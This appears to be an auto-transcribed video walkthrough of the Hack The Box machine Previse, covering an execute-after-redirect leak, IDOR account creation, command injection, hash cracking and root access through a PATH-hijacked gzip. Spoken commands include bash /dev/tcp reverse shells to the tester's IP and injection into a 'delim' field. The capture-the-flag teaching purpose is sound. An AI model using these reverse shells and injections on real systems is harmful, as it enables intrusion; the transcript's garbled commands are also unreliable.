 what's going on youtube this is ipsec i'm doing previs from hack the box which is a nice easy box in the intended route it's something that's been unintended on many machines at hack the box and i just didn't know the name of the exploit class which is an execute after read vulnerability now that name sounds really bad because it's got execute in the name but it's not like a arbitrary code execution where you can make the web server execute anything you want it's when the web server sends you a redirect because you don't have access to that page but keeps on executing the script leaking out what the page would have looked like so it's more of a information disclosure vulnerability however this application is also vulnerable to idor all over the place which is an insecure direct object reference which essentially means as an unauthenticated user we can do things that an admin could as long as we know the magic data to send it and the information leakage from the execute after read vulnerability is just that there's a bunch of other fun stuff in this box so let's just hop right on in as always we start out with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats print the nmap directory and call it previous and then the ip address which is 1010 11 104. this can take some time to run so i've already ran it looking at the results we have just two ports open the very first one is ssh on port 22 and its banner tells us it's an ubuntu server we also have http open on port 80. its parent tells us it's apache and also ubuntu and then also the scripts are telling us it's returning the cookie php session id so most likely hosting php scripts especially when you combine that with this line that looks like it is a redirect but it's redirecting us to login.php so let's go take a look at this web server going to 1010 11.104 we just get this previous file storage so i always like doing a go buster let's start that off so go buster dir then dash u for url http 101011 104 w for word list opt sec list uh discovery web content rat small words dot text and then the extension php because this is hosting php scripts you may want to do like text html other things but i like keeping it as small as possible and then dash o for out file and go go buster dot out and right off the bat we get a lot of hits and the really weird thing that we're seeing is we have these redirects uh some 302's 301 redirects let's see it looks like everything that's a file is a through two redirect and then a folder is a 301 but what's more odd is there is a size to these redirects and in most applications when you do a redirect you don't actually include anything in the content we can show this by probably just going to slash and seeing this redirect so let's open up burp suite let's see intercept is on and let's see it's getting login.php so let's just get slash and we can put it in a repeater tab actually so we have this due to redirect and it's telling a browser go to location.php but the code doesn't have a die function at the end after it does the redirect so it keeps outputting all the data and this is called a ear vulnerability it is execute after redirect and it's more of just like an info informational thing i think we can actually do this whole box without this vulnerability which will look at the end of the video but this definitely does help us because we can see a bunch of php files here so i'm just going to copy the file and i'm going to call this index.html and let's go over here and we can cat index.html just copy what i had highlighted that's not what i wanted i want to copy the whole thing watch is only going to copy that line that i clicked on no there we go and i can grip for php and we can see everything here let's see if i can get fancy real quick let's do grepdash o p like that and then maybe this let's see what happens here there we go um this is a positional thing only showing us what we wanted there's probably better flags to do exactly this but how i remember it is this grep is overpowered so that's how i have it like that so we can see all the files here index accounts files status file log and log out and if we went over to go buster we'd probably see those as well and we can probably examine them through the eidor vulnerability because the size was different so like if we look at let's see account is probably here right do we have account we do accounts.php we can see the size so if we wanted to get it we could easily see it but the one thing i like doing is always having recon go in the background so i'm gonna see if we can just do sql map against this real quick so let's clear cache and burp suite admin admin attempt to log in copy it to file and we'll do login dot request and then we can do sql map dash r login dash request dash dash batch so it doesn't ask us any questions it just chooses default for everything and now we can keep on going so at the end of the video i'm going to go into doing this accounts.php without the air vulnerability that execute after redirect but for doing it quickly let's take advantage of that so if we turn intercept on actually let's turn intercept off i can show you the behavior we go to accounts.php it sends us a redirect to login.php if we want to look at that in bareptsuite we can easily do that so we're doing a get let us intercept the response to this request it says 302 found we have all this data here but a browser sees 302 and login.php and then immediately goes to it so what we can do is go back here and then intercept the response to this request forward it and then just change this to 200 okay and now when we forward it to a browser we get to this page so we can try logging in or not logging in but creating an account says username and passwords must be between 5 and 32 characters so let's do ipsec and please subscribe okay i wanted to intercept this request create user center repeater just so we have it if we need it and puts us back on login if i try logging in please subscribe we do get logged in with this previs file hosting so this is the index.php that we had originally seen and we can go over into files and it looks like we could download this so we have sitebackup.zip so i'm going to download that we can move it into a directory and then before i unzip anything i always like creating a directory first because sometimes the zips themselves don't have a directory and then just clob is your working directory so if i unzip site backup we can see it just dropped a bunch of files in my current working directory which isn't ideal if i did that into this directory it may become a pain to clean it up so that's why i always just create a directory before doing the zip so we have a bunch of php things what i'm going to do is grep everything for dollar underscore and the reason why i'm doing that is i just want to see everywhere user input can interact with the site because that's the vulnerability i'm looking for now i don't care about session or server so i'm going to do a grep v to remove those so let's do underscore server and then this backslash pipe is a ore and grep so now we can also do underscore session and we are left with very few things so the less dash s all i did with that if i didn't do it we can see this line is line wrapped but less dash s disables line wrapping and i can do left and right to see more so we may want to look at accounts.php and look at what it's doing with this but right off the line i bat this is not vulnerable if i saw like my sequel syntax and then the post variable then i know oh that's sql injectable most likely but i don't see anything that looks dangerous so far we do have download.php and files.php and it says is upload file so i'm thinking this could be a potential um like lfi vulnerability so let's see exactly how it goes or maybe we can just upload files to the server so if i edit files.php let's see what we can do here we got to success upload files below so how are we uploading files let's see request method select protected i don't know exactly what this is delete from so this is deleting a file but i don't know what protected means it is the column of a table but i don't understand yet how this application is using that select id name user upload time let's see so right here it's looping through everything from um the sql but i don't exactly know off the top my bat so let's just keep going down the list eventually we see this very last one it's doing a exec and then we have post delim and it's logs.php so let's take a look here for logs.php we have log data but that is about it if i just type slash logs.php it's giving us something so maybe we can grab logs.php and we see file logs has an action set to logs.php and the method is post so let's go to log data which is file logs.php and it says request log data let us intercept this request turn it on submit and we go here we got delimiter comma and when we send this we have a bunch of text but looking at the code we see output is equal to exec python ops scripts log process and then the post parameter delim and we're just in a pretty much shell command so if we just put a semicolon here so comma semicolon sleep 1 we see this page responded in 500 milliseconds with a sleep one it's 1500 milliseconds which is 1.5 seconds we get rid of that sleep and it's down in the half a second sleep two and it is 2.5 milliseconds so we definitely have command execution here so i'm going to do is bash c bash dash i and then dev tcp 10 10 14 8 9 000 1 0 and 1 and then we can just do nc lvmp 9001 and send this and we don't have a reverse shell but we know this is vulnerable so chances are we just made a mistake i'm going to url encode everything because that's generally my first step of troubleshooting and the page is not responding to us which is a good sign because it sent us the shell so what i'm going to do here let's do python dash c import pty pty dot spawn bend bash and then ctrl z to background it and we can do stdy raw minus echo then semicolon fg and then all we do is hana twice to get or hit enter twice to get back into a shell and we're in a shell that we have tab autocomplete and everything there the last thing i like doing is export term is equal to x terms so that lets me clear the screen but once i have a shell on the box the very first thing i always go to in a web server is its configuration files because that's going to be where the my sql password is and when you have the mysql password you can enter mysql and dump all the credentials out of the database so let's do that let's do my sql dash u root specify dash p for password and then copy the whole thing and then we can do show databases and see all the databases here my first step is always going into the web application previs is the non-default one we can do show tables and there's a files and account i'm guessing the thing i want is accounts but i just want to see what file is and what this what is protected uh select protected from star uh wait select protected from uh files there we go so it's only one let's see name protected if i had to guess this protected flag is preventing file deletion would be my assumption but there was one other interesting thing i saw in this database is they have actual data and its type is a blob so all the files are actually being stored in the database so if i do select data from files we see this is the zip um right here is the magic bytes for zip we see accounts.php which is that file name so even if we uploaded files to the server we can't really get code execution because it's just storing them in the database so let's just go to the accounts so select star from accounts and we have two accounts um malware and then ipsec we know what my password is um it's got some weird characters here that's going to make extracting this a pane so let's do select star from accounts where id is equal to one because i only want to get malwares and what i'm going to do is we can select to base64 password from accounts and now we converted this field into base64 which allows us to copy these characters which are bad characters so we can show this by let's do v or we can just do echo dash n base 64-d to output by cat output we see that if i just had copy and pasted this i'm gonna guess these files are not the same i'm not a hundred percent positive but um you'd really have no guarantee so let's do xd output and xd test and let's see it looks like it actually did copy and paste correctly this is dollar one dollar and then here's where those like bytes are weird f zero nine f a seven eight two six c so we can see it copied just fine so we didn't have to go in the base 64 thing but always better safe than sorry so the next thing we want to do is try to crack this password so if i cat output this is just md5 crypt let's see can we just do hash cat what version of hashtag do i have six let's see if i can just do hash cat on this um vm if not then i have to go pause the video and power up my kraken so hash cat dash m i think 500 is md5 crypt um let's do dictionary would be uh let's see user share word list raw q dot text and then the hash is output see actually it goes hash file and then dictionary see unknown target cpu generic yeah hashcat's not working on my box um and i think the kraken is offline yeah it is but through the magic of video editing i was able to uh pause the video power on the box and now we can run hash cat so let's cat the password so let's do cat output we already know we should be able to copy and paste these bad characters so i'm not going to base 64 it so we go into hashcat and then i'm going to v hashes previous paste it in and then we can do hash cat and i actually don't think we need to do dash m 500 because it will just auto detect which is a cool feature in the latest version of hex cat so hashes and then the other thing i want to do is up word list rocky.text so let's see if it automatically detects this is md5 crypt um auto detecting let's see did it yep it detected as 500 md5 crypt and it is now attempting to crack this password if it does not get it which it did just get it i was gonna say if it doesn't get it i try it again with um copying base64 but it is i love kodi and then one one two two three five so if we look at the users on this box in passwd we can see malware is a user so i'm going to try s u m for l w h e r e and we can see indeed that is this guy's password now whenever i have the ability to go into ssh instead of reverse shell i always take that so let's do ssh 10 10 11 104 paste in the password and we are good so we can close that and get user.txt the first thing i always do on a box is check my sudos and we can see something is weird so in close again if you can tell what is different i'm going to run pseudo-l on my box and normally i see this line this whole matching default entry thing and secure path this is preventing me from changing the path with sudo since those aren't there since like environment reset's not there my whole environment is being passed into sudo which means we could potentially do some bad things so let's take a look at ops scripts access backup.sh and let's see bin bash and we see he's trying to do gzip and this can be ran with root so if i just do sudo and the script it's going to back everything up in our backups if we look at that we can see uh january 5th this is my backups we could grab these files and see if there's a different password and maybe um get it that way but before you do that let's see do we have read permissions we do i saw like passed a beauty and chad's like oh we could potentially crack roots but no we can't because only root can read that file but everyone can read all these so we could always grab like this if i do wait it's only access and file access so these aren't actually the source code to the application so there's probably no passwords in there if we cap this it's just going and grabbing log files so it's even less beneficial than i wanted to however because the sudo isn't doing environment reset or secure path we can um take advantage of this not being a absolute path so whenever you do a thing like bash what it's going to do is look in your path and then pick the file that's in the very first result so like if we had to bash and use a local s-pen then that's the one it would execute if we do which bash we can see it's in bin bash and bin would be down here so what we're going to do is edit our path because this is just an environment variable or a variable that we can edit i'm going to put our working directory up front so let's do vi gzip bin bash or bin sh i guess we could do um echo here is your shell this is just so we know it executed because when i do bash at the end of this if i bash gzip it's just going to give me another prompt so that's why i put that echo there so i know something did execute the last thing we have to do is chmod to make it executable because non-executable files won't execute so if i just type gzip now it says it's just um the normal thing we can do which gzip and echo path it's in bin so let's export path is equal to period which is current working directory and then paste everything after this or we can just do path like this we don't have to copy and paste we can do it with the variable as long as we type export correctly so now when i do which gzip it's going to do dot slash gzip before it did bin gzip so if i execute just gzip it's not executing that old binary it's executing mine so now we can do sudo l and execute the script and we get root um cd slash root oh id id we don't have output that's weird um let's see vg zip instead of that let's do we can tell it to execute in bash and then just do bash dash i dev tcp 10 10 14 8. now there's one zero and one then ncovnp 9001 execute this and there we go we have the output um what's happening there is i think or vershell for some reason wasn't capturing standard n and standard out and that's just to have that weird effect but we can see it now we have root.text um i did want to go into the eye door vulnerability so remember at the very beginning of this box we hit accounts.php or account.php right accounts.php is burp suite intercepting log out did i hang the web server oh that's weird curl localhost it's working i think this is my browser that's screwed up 10 10 11 104. let's close firefox open firefox there we go i have no idea what happened but if we did accounts.php um it's just redirecting us so one thing we could try doing is going into burp suite and we can change the request let's get rid of the post see what it looks like here come on i wonder if my now my vpn's not having an issue right because my ssh is working see get slash does only want one line break an extra one this is becoming problematic prep suite proxy intercept okay okay maybe it's a cookie maybe that cookie like something happened in that request and the yep it is the cookie so something happened to that session that i had there and cause all sorts of weirdness but we're good so if we didn't have that execute after redirect we wouldn't be able to see all this we'd only be able to see what's in the header we want accounts.php so what we could do is send a post request to this and let's see does this say anything maybe we need that execute after relay because it would be still a redirect but what i was going to say is instead of putting in the browser we could either just read this whole thing or fuzz it so if i do use name is equal to please subscribe and then send the request we look at the output we can see the username needs be provided user name this is weird hold on post logs now accounts.php let's get rid of this php session okay do you have a typo or something let's see this post slash accounts i was trying to decide what is different between these two because this is telling me the username needs to be provided and this one is telling me password needs to be provided i wonder if it is this cookie 302 no what is different between these two requests oh this has content type so this header is a super important one in doing web fuzzing and things um always be sure when doing post requests to have that there we go so if we put this so we can always quickly find here it says the password needs to be provided so we can do and password is equal to please subscribe and this would be kind of how you fuzz an api now it's saying the password confirmation needs to be provided so what we could do here is probably fuzz this so let's do w fuzz dash u for url http 101011. was it 104 dash u x and then username is equal to please subscribe and password is equal to would do ipsec and this will be fuzz because we don't know this parameter is equal to ipsec because it says password confirmation needs to be provided it's either like password2 password confirm confirm confirmation we don't know that last variable so that's what we're doing here and dash w for word list opt sec list fuzzing and then there are parameters let's see cd opt set list fuzzing ls grep p-a-r let's do find dot grap-i param okay it's discovery web content not a fuzz discovery web content parameter names so if we try this we have an error so let's see w fuzz i wonder if it's like dash d or something for data i know i thought it was x and that looks better so we can do dash h h i think to hide 2 8 0 1 and we'll see if this hits it actually not positive if it's in this i'm guessing it would be let's see while this goes we can cheat a little bit cut this file grep i think it's confirm it is indeed here but what we may be missing is that header again so i'm going to do dash h and then specify this content type like that and it is through to redirects which is kind of what we expected but we do expect once a parameter is hit for it to differ in the number of characters it outputs and to tell us and it is not doing that let's see where is confirm in this vi confirm line 82 so it should tell us almost immediately so we have an error so i wonder let's see dash h proxy [Music] so i p port type so we can do dash p 127.001 8080 http so i want to send the request to burp suite to see exactly what this looks like once it encaps okay and what we forgot to do is slash accounts.php so http accounts.php and we probably want to hide four one three one and we can see confirm gets four one one o characters and that is going to be the one we want so and confirm is equal to please subscribe we go back here we can see username must be between 5 and 32 characters so let's do the username ipsec2 and we have success user was added so that is how you can kind of fuzz this whole output um the other thing i want to go into while we have you we can look at it real quick the actual vulnerability um cd ver www.html this is how we would fix the execute after relay so if i look at index.php we have this is set header location and what you do we need to get root ncl vmp 9001 okay so vera www.html we have to get a tty tty minus was it royko it was not that one second oh man i'm having like brain farts all over the place let me slow down do this okay python3 dash c import pty pty dot spawn bin bash stty raw minus echo fg enter enter there we go export term is equal to x term okay there we go so let's go back to index and all we do so this is if we're not logged in just add a die so now when we go to burp suite we get slash we probably have to get rid of this cookie it's just redirecting us and we no longer have the data so that's all they'd have to do everywhere is just put die statements there and then that whole execute after redirect would be fixed so hope you guys enjoyed the video take care and i will see you all next time